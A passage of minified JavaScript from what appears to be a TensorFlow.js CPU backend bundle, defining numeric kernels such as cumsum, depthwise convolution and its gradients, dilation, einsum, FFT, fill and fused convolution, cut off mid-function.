            const g = e.makeTensorInfo(l.shape, d, h);
            if (null != c) {
                const x = Ke({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        perm: Cs(c)
                    }
                });
                return e.disposeIntermediateTensorInfo(g),
                e.disposeIntermediateTensorInfo(l),
                x
            }
            return g
        }
    };
    const h3 = {
        kernelName: La,
        backendName: "cpu",
        kernelFunc: function d3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, exclusive: i, reverse: a} = s;
            it(o, "cumsum");
            const c = Yt([r], o.shape.length);
            let l = o;
            null != c && (l = Ke({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: c
                }
            }));
            const u = ee(1, o.shape.length)[0];
            if (u !== l.shape.length - 1)
                throw new Error(`backend.cumsum in CPU expects an inner-most axis=${l.shape.length - 1} but got axis=${u}`);
            const d = _e(l.dtype, "int32")
              , h = ke(Z(l.shape), d)
              , p = e.data.get(l.dataId).values
              , f = l.shape[l.shape.length - 1]
              , m = a ? (b,x)=>b + f - x - 1 : (b,x)=>b + x;
            for (let b = 0; b < p.length; b += f)
                for (let x = 0; x < f; x++) {
                    const I = m(b, x);
                    if (0 === x)
                        h[I] = i ? 0 : p[I];
                    else {
                        const y = m(b, x - 1);
                        h[I] = i ? p[y] + h[y] : p[I] + h[y]
                    }
                }
            const g = e.makeTensorInfo(l.shape, d, h);
            if (null != c) {
                const x = Ke({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        perm: Cs(c)
                    }
                });
                return e.disposeIntermediateTensorInfo(g),
                e.disposeIntermediateTensorInfo(l),
                x
            }
            return g
        }
    };
    const f3 = {
        kernelName: mu,
        backendName: "cpu",
        kernelFunc: function p3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, weights: r} = t
              , {size: i, binaryOutput: a} = s;
            if (1 === o.shape.length) {
                const u = up(e.data.get(o.dataId).values, e.data.get(r.dataId).values, r.dtype, r.shape, i);
                return e.makeTensorInfo([i], r.dtype, u)
            }
            if (2 === o.shape.length) {
                const u = _x(e.bufferSync(o), e.bufferSync(r), i, a);
                return e.makeTensorInfo(u.shape, r.dtype, u.values)
            }
            throw new Error(`Error in denseBincount: input must be at most rank 2, but got rank${o.shape.length}.`)
        }
    };
    const g3 = {
        kernelName: gu,
        backendName: "cpu",
        kernelFunc: function m3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {blockSize: r, dataFormat: i} = s;
            v("NHWC" === i, (()=>`Only NHWC dataFormat supported on CPU for depthToSpace. Got ${i}`));
            const a = o.shape[0]
              , c = o.shape[1]
              , l = o.shape[2]
              , u = o.shape[3]
              , d = c * r
              , h = l * r
              , p = u / (r * r)
              , f = e.data.get(o.dataId).values
              , m = new Float32Array(a * d * h * p);
            let g = 0;
            for (let b = 0; b < a; ++b)
                for (let x = 0; x < d; ++x) {
                    const I = Math.floor(x / r)
                      , y = x % r;
                    for (let w = 0; w < h; ++w) {
                        const C = Math.floor(w / r)
                          , S = (y * r + w % r) * p;
                        for (let T = 0; T < p; ++T) {
                            const L = T + S + u * (C + l * (I + c * b));
                            m[g++] = f[L]
                        }
                    }
                }
            return e.makeTensorInfo([a, d, h, p], o.dtype, m)
        }
    };
    function Jy(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o, filter: r} = t
          , {strides: i, pad: a, dilations: c, dimRoundingMode: l} = s;
        it([o, r], "depthwiseConv2DNative");
        const u = ct(o.shape)
          , d = ct(r.shape);
        let h = c;
        null == h && (h = [1, 1]),
        v(Te(i, h), (()=>`Error in depthwiseConv2d: Either strides or dilations must be 1. Got strides ${i} and dilations '${h}'`));
        const p = ye(o.shape, r.shape, i, h, a, l, !0)
          , {filterHeight: f, filterWidth: m, dilationHeight: g, dilationWidth: b, padInfo: x} = p
          , I = x.left
          , y = x.top
          , w = p.outChannels / p.inChannels
          , C = new xe(p.outShape,o.dtype)
          , k = e.data.get(o.dataId).values
          , S = e.data.get(r.dataId).values
          , T = C.values;
        for (let R = 0; R < p.batchSize; ++R) {
            const L = R * u[0]
              , V = R * C.strides[0];
            for (let F = 0; F < p.outHeight; ++F) {
                const X = V + F * C.strides[1]
                  , A = F * p.strideHeight - y;
                for (let P = 0; P < f; ++P) {
                    const B = A + P * g;
                    if (B < 0 || B >= p.inHeight)
                        continue;
                    const K = P * d[0]
                      , H = L + B * u[1];
                    for (let U = 0; U < p.outWidth; ++U) {
                        const Y = X + U * C.strides[2]
                          , j = U * p.strideWidth - I;
                        for (let J = 0; J < m; ++J) {
                            const nt = j + J * b;
                            if (nt < 0 || nt >= p.inWidth)
                                continue;
                            const q = K + J * d[1]
                              , rt = H + nt * p.inChannels;
                            let lt = Y
                              , ft = q;
                            for (let ht = 0; ht < p.inChannels; ++ht) {
                                const xt = k[rt + ht];
                                for (let yt = 0; yt < w; ++yt)
                                    T[lt + yt] += xt * S[ft + yt];
                                lt += w,
                                ft += w
                            }
                        }
                    }
                }
            }
        }
        return e.makeTensorInfo(C.shape, C.dtype, C.values)
    }
    const b3 = {
        kernelName: Ea,
        backendName: "cpu",
        kernelFunc: Jy
    };
    const y3 = {
        kernelName: bu,
        backendName: "cpu",
        kernelFunc: function x3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, dy: r} = t
              , {strides: i, dilations: a, pad: c, dimRoundingMode: l, filterShape: u} = s;
            it([o, r], "depthwiseConv2dNativeBackpropFilter");
            const d = ye(o.shape, u, i, a, c, l, !0)
              , {strideHeight: h, strideWidth: p, filterHeight: f, filterWidth: m} = d
              , g = new xe(d.filterShape,"float32")
              , b = d.padInfo.left
              , x = d.padInfo.top
              , I = d.outChannels / d.inChannels
              , y = e.data.get(o.dataId).values
              , w = new xe(o.shape,o.dtype,y)
              , C = e.data.get(r.dataId).values
              , k = new xe(r.shape,r.dtype,C);
            for (let S = 0; S < f; ++S) {
                const T = Math.max(0, Math.ceil((x - S) / h))
                  , R = Math.min(d.outHeight, (d.inHeight + x - S) / h);
                for (let L = 0; L < m; ++L) {
                    const V = Math.max(0, Math.ceil((b - L) / p))
                      , F = Math.min(d.outWidth, (d.inWidth + b - L) / p);
                    for (let X = 0; X < d.outChannels; ++X) {
                        const A = Math.trunc(X / I)
                          , P = X % I;
                        let B = 0;
                        for (let K = 0; K < d.batchSize; ++K)
                            for (let H = T; H < R; ++H) {
                                const U = S + H * h - x;
                                for (let Y = V; Y < F; ++Y) {
                                    const j = L + Y * p - b;
                                    B += w.get(K, U, j, A) * k.get(K, H, Y, X)
                                }
                            }
                        g.set(B, S, L, A, P)
                    }
                }
            }
            return e.makeTensorInfo(g.shape, g.dtype, g.values)
        }
    };
    const w3 = {
        kernelName: xu,
        backendName: "cpu",
        kernelFunc: function I3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, filter: r} = t
              , {strides: i, dilations: a, pad: c, dimRoundingMode: l, inputShape: u} = s;
            it([o, r], "depthwiseConv2DNativeBackpropInput");
            const d = ct(o.shape)
              , h = ct(r.shape)
              , p = ye(u, r.shape, i, a, c, l, !0)
              , f = new xe(p.inShape,"float32")
              , m = f.values
              , [g,b,x] = f.strides
              , I = e.data.get(o.dataId).values
              , [y,w,C] = d
              , k = e.data.get(r.dataId).values
              , [S,T,R] = h
              , {batchSize: L, filterHeight: V, filterWidth: F, inChannels: X, inHeight: A, inWidth: P, outChannels: B, outHeight: K, outWidth: H, strideHeight: U, strideWidth: Y} = p
              , j = V - 1 - p.padInfo.top
              , J = F - 1 - p.padInfo.left
              , nt = B / X;
            for (let q = 0; q < L; ++q)
                for (let rt = 0; rt < X; ++rt)
                    for (let lt = 0; lt < A; ++lt) {
                        const ft = lt - j
                          , ht = Math.max(0, Math.ceil(ft / U))
                          , xt = Math.min(K, (V + ft) / U);
                        for (let yt = 0; yt < P; ++yt) {
                            const Dt = yt - J
                              , Pt = Math.max(0, Math.ceil(Dt / Y))
                              , jt = Math.min(H, (F + Dt) / Y);
                            let Ot = 0;
                            for (let Mt = ht; Mt < xt; ++Mt) {
                                const Jt = Mt * U - ft;
                                for (let Ut = Pt; Ut < jt; ++Ut) {
                                    const ve = y * q + w * Mt + C * Ut
                                      , Xs = S * (V - 1 - Jt) + T * (F - 1 - (Ut * Y - Dt)) + R * rt;
                                    for (let cn = 0; cn < nt; ++cn) {
                                        Ot += I[ve + (rt * nt + cn)] * k[Xs + cn]
                                    }
                                }
                            }
                            m[g * q + b * lt + x * yt + rt] = Ot
                        }
                    }
            return e.makeTensorInfo(f.shape, f.dtype, f.values)
        }
    };
    const v3 = {
        kernelName: "Diag",
        backendName: "cpu",
        kernelFunc: function C3(n) {
            const {inputs: t, backend: e} = n
              , {x: s} = t
              , o = Z(s.shape)
              , r = e.data.get(s.dataId).values
              , i = wt([o, o], s.dtype)
              , a = i.values;
            for (let l = 0; l < r.length; l++)
                a[l * o + l] = r[l];
            const c = [...s.shape, ...s.shape];
            return e.makeTensorInfo(c, i.dtype, i.values)
        }
    }
      , S3 = {
        kernelName: Da,
        backendName: "cpu",
        kernelFunc: ({inputs: n, backend: t, attrs: e})=>{
            const {x: s, filter: o} = n
              , {strides: r, pad: i, dilations: a} = e
              , c = t
              , l = c.data.get(s.dataId).values
              , u = s.shape.length
              , d = c.data.get(o.dataId).values
              , h = o.shape.length
              , {batchSize: p, inHeight: f, inWidth: m, inChannels: g, outHeight: b, outWidth: x, padInfo: I, strideHeight: y, strideWidth: w, filterHeight: C, filterWidth: k, dilationHeight: S, dilationWidth: T, outShape: R} = Si(s.shape, o.shape, r, i, "NHWC", a)
              , L = Z(R)
              , V = R.length
              , F = qt(s.dtype, L);
            for (let A = 0; A < p; ++A)
                for (let P = 0; P < b; ++P) {
                    const B = P * y - I.top;
                    for (let K = 0; K < x; ++K) {
                        const H = K * w - I.left;
                        for (let U = 0; U < g; ++U) {
                            let Y = Number.MIN_SAFE_INTEGER;
                            for (let J = 0; J < C; ++J) {
                                const nt = B + J * S;
                                if (nt >= 0 && nt < f)
                                    for (let q = 0; q < k; ++q) {
                                        const rt = H + q * T;
                                        if (rt >= 0 && rt < m) {
                                            const lt = Fn([A, nt, rt, U], u, ct(s.shape))
                                              , ft = Fn([J, q, U], h, ct(o.shape))
                                              , ht = l[lt] + d[ft];
                                            ht > Y && (Y = ht)
                                        }
                                    }
                            }
                            F[Fn([A, P, K, U], V, ct(R))] = Y
                        }
                    }
                }
            return {
                dataId: c.write(Ys(F, s.dtype), R, s.dtype),
                shape: R,
                dtype: s.dtype
            }
        }
    }
      , k3 = {
        kernelName: Iu,
        backendName: "cpu",
        kernelFunc: ({inputs: n, backend: t, attrs: e})=>{
            const {x: s, filter: o, dy: r} = n
              , {strides: i, pad: a, dilations: c} = e
              , l = t
              , u = vn(s.shape, l.data.get(s.dataId).values)
              , d = vn(o.shape, l.data.get(o.dataId).values)
              , {batchSize: h, inHeight: p, inWidth: f, inChannels: m, outHeight: g, outWidth: b, padInfo: x, strideHeight: I, strideWidth: y, filterHeight: w, filterWidth: C, dilationHeight: k, dilationWidth: S, outShape: T} = Si(s.shape, o.shape, i, a, "NHWC", c);
            v(r.rank === T.length, (()=>`Error in ${Iu}, dy must have the same rank as output ${T.length}, but got ${r.rank}`));
            const R = vn(T, l.data.get(r.dataId).values)
              , L = ff(o.shape, o.dtype);
            for (let F = 0; F < h; ++F)
                for (let X = 0; X < g; ++X) {
                    const A = X * I - x.top;
                    for (let P = 0; P < b; ++P) {
                        const B = P * y - x.left;
                        for (let K = 0; K < m; ++K) {
                            let H = Number.MIN_SAFE_INTEGER
                              , U = 0
                              , Y = 0;
                            for (let j = 0; j < w; ++j) {
                                const J = A + j * k;
                                if (J >= 0 && J < p)
                                    for (let nt = 0; nt < C; ++nt) {
                                        const q = B + nt * S;
                                        if (q >= 0 && q < f) {
                                            const rt = u[F][J][q][K] + d[j][nt][K];
                                            rt > H && (H = rt,
                                            U = j,
                                            Y = nt)
                                        }
                                    }
                            }
                            L[U][Y][K] += R[F][X][P][K]
                        }
                    }
                }
            return {
                dataId: l.write(Ys(L, s.dtype), o.shape, o.dtype),
                shape: o.shape,
                dtype: o.dtype
            }
        }
    }
      , T3 = {
        kernelName: yu,
        backendName: "cpu",
        kernelFunc: ({inputs: n, backend: t, attrs: e})=>{
            const {x: s, filter: o, dy: r} = n
              , {strides: i, pad: a, dilations: c} = e
              , l = t
              , u = vn(s.shape, l.data.get(s.dataId).values)
              , d = vn(o.shape, l.data.get(o.dataId).values)
              , {batchSize: h, inHeight: p, inWidth: f, inChannels: m, outHeight: g, outWidth: b, padInfo: x, strideHeight: I, strideWidth: y, filterHeight: w, filterWidth: C, dilationHeight: k, dilationWidth: S, outShape: T} = Si(s.shape, o.shape, i, a, "NHWC", c);
            v(r.rank === T.length, (()=>`Error in ${yu}, dy must have the same rank as output ${T.length}, but got ${r.rank}`));
            const R = vn(T, l.data.get(r.dataId).values)
              , L = ff(s.shape, s.dtype);
            for (let F = 0; F < h; ++F)
                for (let X = 0; X < g; ++X) {
                    const A = X * I - x.top;
                    for (let P = 0; P < b; ++P) {
                        const B = P * y - x.left;
                        for (let K = 0; K < m; ++K) {
                            let H = Number.MIN_SAFE_INTEGER
                              , U = A < 0 ? 0 : A
                              , Y = B < 0 ? 0 : B;
                            for (let j = 0; j < w; ++j) {
                                const J = A + j * k;
                                if (J >= 0 && J < p)
                                    for (let nt = 0; nt < C; ++nt) {
                                        const q = B + nt * S;
                                        if (q >= 0 && q < f) {
                                            const rt = u[F][J][q][K] + d[j][nt][K];
                                            rt > H && (H = rt,
                                            U = J,
                                            Y = q)
                                        }
                                    }
                            }
                            L[F][U][Y][K] += R[F][X][P][K]
                        }
                    }
                }
            return {
                dataId: l.write(Ys(L, s.dtype), s.shape, s.dtype),
                shape: s.shape,
                dtype: s.dtype
            }
        }
    };
    const R3 = {
        kernelName: "Draw",
        backendName: "cpu",
        kernelFunc: function N3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {image: o} = t
              , {canvas: r, options: i} = s
              , {contextOptions: a, imageOptions: c} = i || {}
              , l = (null == c ? void 0 : c.alpha) || 1
              , u = (null == a ? void 0 : a.contextType) || "2d";
            if ("2d" !== u)
                throw new Error(`Context type ${a.contextType} is not supported by the CPU backend.`);
            const d = r.getContext(u, (null == a ? void 0 : a.contextAttributes) || {});
            if (null == d)
                throw new Error(`Could not get the context with ${u} type.`);
            const [h,p] = o.shape.slice(0, 2)
              , f = 2 === o.shape.length ? 1 : o.shape[2]
              , m = e.data.get(o.dataId).values
              , g = "float32" === o.dtype ? 255 : 1
              , b = new Uint8ClampedArray(p * h * 4);
            for (let I = 0; I < h * p; ++I) {
                const y = [0, 0, 0, 255 * l];
                for (let C = 0; C < f; C++) {
                    const k = m[I * f + C];
                    if ("float32" === o.dtype) {
                        if (k < 0 || k > 1)
                            throw new Error(`Tensor values for a float32 Tensor must be in the range [0 - 1] but encountered ${k}.`)
                    } else if ("int32" === o.dtype && (k < 0 || k > 255))
                        throw new Error(`Tensor values for a int32 Tensor must be in the range [0 - 255] but encountered ${k}.`);
                    1 === f ? (y[0] = k * g,
                    y[1] = k * g,
                    y[2] = k * g) : y[C] = k * g
                }
                const w = 4 * I;
                b[w + 0] = Math.round(y[0]),
                b[w + 1] = Math.round(y[1]),
                b[w + 2] = Math.round(y[2]),
                b[w + 3] = Math.round(y[3])
            }
            r.width = p,
            r.height = h;
            const x = new ImageData(b,p,h);
            return d.putImageData(x, 0, 0),
            o
        }
    };
    function ea(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {axis: r, keepDims: i} = s;
        let a;
        it(o, "sum"),
        a = "bool" === o.dtype ? Ws({
            inputs: {
                x: o
            },
            backend: e,
            attrs: {
                dtype: "int32"
            }
        }) : Qn({
            inputs: {
                x: o
            },
            backend: e
        });
        const c = a.shape.length
          , l = It(r, a.shape)
          , u = Yt(l, c);
        let d = l
          , h = a;
        null != u && (h = Ke({
            inputs: {
                x: a
            },
            backend: e,
            attrs: {
                perm: u
            }
        }),
        d = ee(d.length, c)),
        Ie("sum", d, h.shape.length);
        const [p,f] = me(h.shape, d);
        let g = pl(e, p, _e(h.dtype, "int32"));
        const b = Z(f)
          , x = e.data.get(g.dataId).values
          , I = e.data.get(h.dataId).values;
        for (let y = 0; y < x.length; ++y) {
            const w = y * b;
            let C = 0;
            for (let k = 0; k < b; ++k)
                C += I[w + k];
            x[y] = C
        }
        if (i) {
            const w = g;
            g = At({
                inputs: {
                    x: g
                },
                backend: e,
                attrs: {
                    shape: re(g.shape, l)
                }
            }),
            e.disposeIntermediateTensorInfo(w)
        }
        return e.disposeIntermediateTensorInfo(a),
        null != u && e.disposeIntermediateTensorInfo(h),
        g
    }
    const $3 = {
        kernelName: hc,
        backendName: "cpu",
        kernelFunc: ea
    };
    const L3 = {
        kernelName: wu,
        backendName: "cpu",
        kernelFunc: function G3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {equation: o} = s
              , r = t
              , {allDims: i, summedDims: a, idDims: c} = bh(o, r.length);
            yh(i.length, c, r);
            const {path: l, steps: u} = Ih(a, c)
              , d = u.length;
            let h = null
              , p = i.length;
            const f = [];
            for (let m = 0; m < d; ++m) {
                for (const g of u[m]) {
                    const {permutationIndices: b, expandDims: x} = xh(p, c[g]);
                    let I;
                    wh(b) ? I = r[g] : (I = Ke({
                        inputs: {
                            x: r[g]
                        },
                        backend: e,
                        attrs: {
                            perm: b
                        }
                    }),
                    f.push(I));
                    const y = I.shape.slice();
                    for (let w = 0; w < x.length; ++w)
                        y.splice(x[w], 0, 1);
                    Rt(I.shape, y) || (I = At({
                        inputs: {
                            x: I
                        },
                        backend: e,
                        attrs: {
                            shape: y
                        }
                    }),
                    f.push(I)),
                    null === h ? h = I : (h = fl({
                        inputs: {
                            a: I,
                            b: h
                        },
                        backend: e
                    }),
                    f.push(h))
                }
                m < d - 1 && (l[m] >= 0 && (h = ea({
                    inputs: {
                        x: h
                    },
                    backend: e,
                    attrs: {
                        axis: l[m] - (i.length - p),
                        keepDims: !1
                    }
                }),
                f.push(h)),
                p--)
            }
            for (const m of f)
                m !== h && e.disposeIntermediateTensorInfo(m);
            return h
        }
    };
    const D3 = {
        kernelName: Cu,
        backendName: "cpu",
        kernelFunc: function E3(n) {
            const {inputs: t, backend: e} = n
              , {dy: s, y: o} = t;
            it([s, o], "eluGrad");
            const r = new Float32Array(Z(o.shape))
              , i = e.data.get(o.dataId).values
              , a = e.data.get(s.dataId).values;
            for (let c = 0; c < i.length; ++c) {
                const l = i[c];
                r[c] = l >= 0 ? a[c] : a[c] * (l + 1)
            }
            return e.makeTensorInfo(o.shape, "float32", r)
        }
    }
      , W3 = lh
      , M3 = uh
      , V3 = dh
      , F3 = hh
      , z3 = ph
      , X3 = fh
      , A3 = Et(Fr, (n=>{
        const t = Math.sign(n)
          , e = Math.abs(n)
          , s = 1 / (1 + W3 * e);
        return t * (1 - ((((X3 * s + z3) * s + F3) * s + V3) * s + M3) * s * Math.exp(-e * e))
    }
    ))
      , P3 = {
        kernelName: Fr,
        backendName: "cpu",
        kernelFunc: A3
    };
    function bl(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {input: o} = t
          , {dim: r} = s
          , i = o.shape.length
          , a = o.shape.slice();
        let c = r;
        return r < 0 && (v(-(i + 1) <= r, (()=>`Axis must be in the interval [${-(i + 1)}, ${i}]`)),
        c = i + r + 1),
        a.splice(c, 0, 1),
        At({
            inputs: {
                x: o
            },
            backend: e,
            attrs: {
                shape: a
            }
        })
    }
    const O3 = {
        kernelName: Ma,
        backendName: "cpu",
        kernelFunc: bl
    }
      , K3 = oe(((n,t)=>n / t))
      , gp = pe(Mr, K3)
      , bp = {
        kernelName: Mr,
        backendName: "cpu",
        kernelFunc: gp
    };
    function jy(n, t, e) {
        const s = n.shape
          , o = s[0]
          , r = s[1]
          , i = e.data.get(n.dataId)
          , a = i.complexTensorInfos.real
          , c = i.complexTensorInfos.imag
          , l = [o, r]
          , u = Z(l)
          , d = Se("float32", u)
          , h = Se("float32", u);
        for (let g = 0; g < o; g++) {
            const b = wo({
                inputs: {
                    x: a
                },
                backend: e,
                attrs: {
                    begin: [g, 0],
                    size: [1, r]
                }
            })
              , x = wo({
                inputs: {
                    x: c
                },
                backend: e,
                attrs: {
                    begin: [g, 0],
                    size: [1, r]
                }
            })
              , I = Qe({
                inputs: {
                    real: b,
                    imag: x
                },
                backend: e
            })
              , {real: y, imag: w} = Z3(I, t, e)
              , C = as(y, w);
            for (let k = 0; k < r; k++) {
                const S = mh(C, k);
                d[g * r + k] = S.real,
                h[g * r + k] = S.imag
            }
            e.disposeIntermediateTensorInfo(b),
            e.disposeIntermediateTensorInfo(x),
            e.disposeIntermediateTensorInfo(I)
        }
        const p = e.makeTensorInfo(l, "float32", d)
          , f = e.makeTensorInfo(l, "float32", h)
          , m = Qe({
            inputs: {
                real: p,
                imag: f
            },
            backend: e
        });
        return e.disposeIntermediateTensorInfo(p),
        e.disposeIntermediateTensorInfo(f),
        m
    }
    function Z3(n, t, e) {
        const s = Z(n.shape)
          , o = e.data.get(n.dataId)
          , r = e.data.get(o.complexTensorInfos.real.dataId).values
          , i = e.data.get(o.complexTensorInfos.imag.dataId).values;
        if (function B3(n) {
            return !(n & n - 1)
        }(s)) {
            const a = xp(r, i, s, t, e)
              , c = [n.shape[0], n.shape[1]];
            if (t) {
                const l = e.makeTensorInfo(c, "float32", a.real)
                  , u = e.makeTensorInfo(c, "float32", a.imag)
                  , d = e.makeTensorInfo([], "float32", gs(s, "float32"))
                  , h = Qn({
                    inputs: {
                        x: d
                    },
                    backend: e
                })
                  , p = bp.kernelFunc({
                    inputs: {
                        a: l,
                        b: d
                    },
                    backend: e
                })
                  , f = bp.kernelFunc({
                    inputs: {
                        a: u,
                        b: h
                    },
                    backend: e
                })
                  , m = e.data.get(p.dataId).values
                  , g = e.data.get(f.dataId).values;
                return e.disposeIntermediateTensorInfo(l),
                e.disposeIntermediateTensorInfo(u),
                e.disposeIntermediateTensorInfo(d),
                e.disposeIntermediateTensorInfo(h),
                e.disposeIntermediateTensorInfo(p),
                e.disposeIntermediateTensorInfo(f),
                {
                    real: m,
                    imag: g
                }
            }
            return a
        }
        {
            const c = function H3(n, t, e) {
                const s = new Float32Array(2 * t);
                for (let o = 0; o < t; o++) {
                    let r = 0
                      , i = 0;
                    for (let a = 0; a < t; a++) {
                        const c = Mg(o * a, t, e)
                          , l = mh(n, a);
                        r += l.real * c.real - l.imag * c.imag,
                        i += l.real * c.imag + l.imag * c.real
                    }
                    e && (r /= t,
                    i /= t),
                    Dg(s, r, i, o)
                }
                return s
            }(as(r, i), s, t);
            return Gg(c)
        }
    }
    function xp(n, t, e, s, o) {
        if (1 === e)
            return {
                real: n,
                imag: t
            };
        const r = as(n, t)
          , i = e / 2
          , a = Lg(r)
          , c = a.real
          , l = a.imag
          , u = [c.length]
          , d = o.makeTensorInfo(u, "float32", c)
          , h = o.makeTensorInfo(u, "float32", l)
          , p = Qe({
            inputs: {
                real: d,
                imag: h
            },
            backend: o
        })
          , f = Eg(r)
          , m = f.real
          , g = f.imag
          , b = [m.length]
          , x = o.makeTensorInfo(b, "float32", m)
          , I = o.makeTensorInfo(b, "float32", g)
          , y = Qe({
            inputs: {
                real: x,
                imag: I
            },
            backend: o
        })
          , w = xp(c, l, i, s, o)
          , C = w.real
          , k = w.imag
          , S = [C.length]
          , T = o.makeTensorInfo(S, "float32", C)
          , R = o.makeTensorInfo(S, "float32", k)
          , L = Qe({
            inputs: {
                real: T,
                imag: R
            },
            backend: o
        })
          , V = xp(m, g, i, s, o)
          , F = V.real
          , X = V.imag
          , A = [F.length]
          , P = o.makeTensorInfo(A, "float32", F)
          , B = o.makeTensorInfo(A, "float32", X)
          , K = Qe({
            inputs: {
                real: P,
                imag: B
            },
            backend: o
        })
          , H = Wg(e, s)
          , U = [H.real.length]
          , Y = o.makeTensorInfo(U, "float32", H.real)
          , j = o.makeTensorInfo(U, "float32", H.imag)
          , J = Qe({
            inputs: {
                real: Y,
                imag: j
            },
            backend: o
        })
          , nt = fl({
            inputs: {
                a: J,
                b: K
            },
            backend: o
        })
          , q = ir({
            inputs: {
                a: L,
                b: nt
            },
            backend: o
        })
          , rt = fp({
            inputs: {
                a: L,
                b: nt
            },
            backend: o
        })
          , lt = yo({
            inputs: {
                input: q
            },
            backend: o
        })
          , ft = yo({
            inputs: {
                input: rt
            },
            backend: o
        })
          , ht = ar({
            inputs: {
                input: q
            },
            backend: o
        })
          , xt = ar({
            inputs: {
                input: rt
            },
            backend: o
        })
          , yt = cr({
            inputs: [lt, ft],
            backend: o,
            attrs: {
                axis: 0
            }
        })
          , Dt = cr({
            inputs: [ht, xt],
            backend: o,
            attrs: {
                axis: 0
            }
        })
          , Pt = o.data.get(yt.dataId).values
          , jt = o.data.get(Dt.dataId).values;
        return o.disposeIntermediateTensorInfo(d),
        o.disposeIntermediateTensorInfo(h),
        o.disposeIntermediateTensorInfo(p),
        o.disposeIntermediateTensorInfo(x),
        o.disposeIntermediateTensorInfo(I),
        o.disposeIntermediateTensorInfo(y),
        o.disposeIntermediateTensorInfo(T),
        o.disposeIntermediateTensorInfo(R),
        o.disposeIntermediateTensorInfo(L),
        o.disposeIntermediateTensorInfo(P),
        o.disposeIntermediateTensorInfo(B),
        o.disposeIntermediateTensorInfo(K),
        o.disposeIntermediateTensorInfo(Y),
        o.disposeIntermediateTensorInfo(j),
        o.disposeIntermediateTensorInfo(J),
        o.disposeIntermediateTensorInfo(nt),
        o.disposeIntermediateTensorInfo(q),
        o.disposeIntermediateTensorInfo(rt),
        o.disposeIntermediateTensorInfo(lt),
        o.disposeIntermediateTensorInfo(ht),
        o.disposeIntermediateTensorInfo(ft),
        o.disposeIntermediateTensorInfo(xt),
        o.disposeIntermediateTensorInfo(yt),
        o.disposeIntermediateTensorInfo(Dt),
        {
            real: Pt,
            imag: jt
        }
    }
    const U3 = {
        kernelName: "FFT",
        backendName: "cpu",
        kernelFunc: function _3(n) {
            const {inputs: t, backend: e} = n
              , {input: s} = t
              , o = Z(s.shape)
              , r = s.shape[s.shape.length - 1]
              , a = At({
                inputs: {
                    x: s
                },
                backend: e,
                attrs: {
                    shape: [o / r, r]
                }
            })
              , c = jy(a, !1, e)
              , l = At({
                inputs: {
                    x: c
                },
                backend: e,
                attrs: {
                    shape: s.shape
                }
            });
            return e.disposeIntermediateTensorInfo(a),
            e.disposeIntermediateTensorInfo(c),
            l
        }
    };
    function yp(n) {
        const {backend: t, attrs: e} = n
          , {shape: s, value: o, dtype: r} = e
          , i = r || Mo(o)
          , a = qt(i, Z(s));
        return function Q3(n, t, e) {
            n.fill(t)
        }(a, o),
        t.makeTensorInfo(s, i, a)
    }
    const Y3 = {
        kernelName: Su,
        backendName: "cpu",
        kernelFunc: yp
    };
    const J3 = {
        kernelName: ku,
        backendName: "cpu",
        kernelFunc: ({inputs: n, attrs: t, backend: e})=>{
            const {image: s} = n
              , o = e
              , r = Se(s.dtype, Z(s.shape))
              , [i,a,c,l] = s.shape
              , u = o.data.get(s.dataId).values;
            for (let h = 0; h < i; h++) {
                const p = h * c * a * l;
                for (let f = 0; f < a; f++) {
                    const m = f * (c * l);
                    for (let g = 0; g < c; g++) {
                        const b = g * l;
                        for (let x = 0; x < l; x++) {
                            const I = Math.round(c - g - 1)
                              , y = p + m + b + x;
                            let w = u[y];
                            if (I >= 0 && I < c) {
                                w = u[p + m + I * l + x]
                            }
                            r[y] = w
                        }
                    }
                }
            }
            return {
                dataId: o.write(r, s.shape, s.dtype),
                shape: s.shape,
                dtype: s.dtype
            }
        }
    };
    const q3 = {
        kernelName: Ic,
        backendName: "cpu",
        kernelFunc: function j3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, filter: r, bias: i, preluActivationWeights: a} = t
              , {strides: c, pad: l, dataFormat: u, dilations: d, dimRoundingMode: h, activation: p, leakyreluAlpha: f} = s;
            let m = Qy({
                inputs: {
                    x: o,
                    filter: r
                },
                backend: e,
                attrs: {
                    strides: c,
                    pad: l,
                    dataFormat: u,
                    dilations: d,
                    dimRoundingMode: h
                }
            });
            if (i) {
                const g = m;
                if ("NCHW" === u && 1 === i.shape.length && 1 !== i.shape[0]) {
                    const b = At({
                        inputs: {
                            x: i
                        },
                        backend: e,
                        attrs: {
                            shape: [i.shape[0], 1, 1]
                        }
                    });
                    m = ir({
                        inputs: {
                            a: m,
                            b: b
                        },
                        backend: e
                    }),
                    e.disposeIntermediateTensorInfo(b)
                } else
                    m = ir({
                        inputs: {
                            a: m,
                            b: i
                        },
                        backend: e
                    });
                e.disposeIntermediateTensorInfo(g)
            }
            if (p) {
                const g = m;
                if ("NCHW" === u && "prelu" === p && 1 === a.shape.length && 1 !== a.shape[0]) {
                    const b = At({
                        inputs: {
                            x: a
                        },
                        backend: e,
                        attrs: {
                            shape: [a.shape[0], 1, 1]
                        }
                    });
                    m = gl(e, m, p, b, f),
                    e.disposeIntermediateTensorInfo(b)
                } else
                    m = gl(e, m, p, a, f);
                e.disposeIntermediateTensorInfo(g)
            }
            return m
        }
    };
    const eD = {
        kernelName: zf,
        backendName: "cpu",
        kernelFunc: function tD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, filter: r, bias: i, preluActivationWeights: a} = t
              , {strides: c, pad: l, dataFormat: u, dilations: d, dimRoundingMode: h, activation: p, leakyreluAlpha: f} = s;
            let m = Jy({
                inputs: {
                    x: o,
                    filter: r
                },
                backend: e,
                attrs: {
                    strides: c,
                    pad: l,
                    dataFormat: u,
                    dilations: d,
                    dimRoundingMode: h
                }
            });
            if (i) {
